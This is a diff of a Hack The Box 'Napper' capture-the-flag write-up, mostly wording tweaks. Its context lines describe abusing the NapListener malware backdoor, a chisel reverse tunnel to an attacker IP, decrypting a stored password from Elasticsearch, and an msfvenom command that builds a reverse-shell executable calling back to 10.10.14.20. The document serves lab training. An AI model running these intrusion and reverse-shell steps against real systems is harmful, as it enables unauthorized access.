@@ -93,7 +93,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 53.05 seconds
 ```
-The certificate can be inspected with https://www.sslchecker.com/certdecoder
+Inspect the cetificate with https://www.sslchecker.com/certdecoder
 ```markdown
 Certificate:
     Data:
@@ -190,7 +190,7 @@ We have found another subdomain called `internal.napper.htb`. If we browse it wi
 
 ![napper1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/0e09e565-efa8-45dd-8895-ffe846f21a2f)
 
-Browsing the login site with burpsuite, we see it uses basic authorization, where the credentials are sent in base64. The next step would be to find valid credentials for this site. In the blog `app.napper.htb` there are information about how the basic authorization works.
+Browsing the login site with burpsuite, we see it uses basic authorization. In this type of authorization the credentials are sent in base64. The next step would be to find valid credentials for this site. In the blog `app.napper.htb` there are information about how the basic authorization works.
 ### PHASE 2: User
 Browsing the site we find the procedure they followed to configure the server, including the default password used.
 
@@ -199,7 +199,7 @@ Browsing the site we find the procedure they followed to configure the server, i
 Trying these credentials (example:ExamplePassword) in the login page, we are given access to the internal area. Inside the restricted area we find out there is an investigation ongoing on a malware called naplistener. Doing a search in Internet, we find out 2 good resources to have an undertanding of this malware.<br>
 https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph<br>
 https://thehackernews.com/2023/03/new-naplistener-malware-used-by-ref2924.html<br>
-In summary, it is a malware written in c# which starts an http listener in the infected machines. Once the listener is running, if you send base64 encoded c# payloads to certain endpoint, it will be executed in memory. It is designed to masquerade and evade network-based detection methods, for this same reason, it will only process requests sent to `/ews/MsExgHealthCheckd/`, in the `sdafwe3rwe23` parameter. Any other tries to interact with naplistener will be responded with a 404 code.
+In summary, it is a malware written in c# which starts an http listener in the infected machines. Once the listener is running, if you send base64 encoded c# payloads to certain endpoint, it will be executed in memory. It is designed to masquerade and evade network-based detection methods, for this same reason, it will only process requests sent to `/ews/MsExgHealthCheckd/`, in the `sdafwe3rwe23` parameter. Any other tries to interact with naplistener will be responded with a 404 code.<br>
 To verify if naplistener is running in the host, we send a base64 "aaa" payload to the endpoint and it is respondeded with OK 200. Therefore, naplistener is running in the system.
 
 ![napper3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/1140e4eb-37fb-4e53-a586-589b630da358)
@@ -322,7 +322,7 @@ ELASTICUSER=user
 ELASTICPASS=DumpPassword\$Here
 ELASTICURI=https://127.0.0.1:9200
 ```
-We also find a local service running on port 9200, doing some research, we find out this port is owned by elasticsearch. Place a chisel and forward port 9200 to kali.
+We also find a local service running on port 9200, doing some research, we find out this port is owned by elasticsearch. Place a `chisel` and forward port 9200 to kali.
 ```markdown
 ./chisel64 server -p 8000 --reverse
 chisel64.exe client 10.10.14.20:8000 R:9200
@@ -337,9 +337,10 @@ Conclusions after inspecting the source code:
 
 ![napper5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b5dc1e65-ab60-4883-9cae-019afdf52890)
 
-Use the `elastic` user ceredentials to log into the elasticsearch site. Query the https://localhost:9200/_search endpoint to find the `blob` parameter, which contains the encoded current password for user `backup` and the `seed` used to AES encode it.
-Once both parameters are retrieved, we can decode the `backup` user password. For this, it is needed to create our own go script, one good starting point can be found here: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865
-Also, bear in mind that password for user `backup` is updated periodically. Once the password is obtained, we just need to log in as user `backup`. There are no open ports 135, 445, 3389, 5985, so `impacket`, `rdesktop` and `evil-winrm` are discarded. A good alternative could be `runascs` with a `shell.exe` payload generated with `msfvenom`
+Use the `elastic` user ceredentials to log into the elasticsearch site. Query the https://localhost:9200/_search endpoint to find the `blob` parameter, which contains the encoded current password for user `backup` and the `seed` used to AES encode it.<br>
+Once both parameters are retrieved, we can decode the `backup` user password. For this, it is needed to create our own go script, one good starting point can be found here: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865<br>
+Also, bear in mind that password for user `backup` is updated periodically.<br>
+Once the password is obtained, we just need to log in as user `backup`. There are no open ports 135, 445, 3389, 5985, so `impacket`, `rdesktop` and `evil-winrm` are discarded. A good alternative could be `runascs` with a `shell.exe` payload generated with `msfvenom`
 ```markdown
 > msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.20 lport=9000 -f exe -a x64 --platform windows -o shell.exe  
 ```
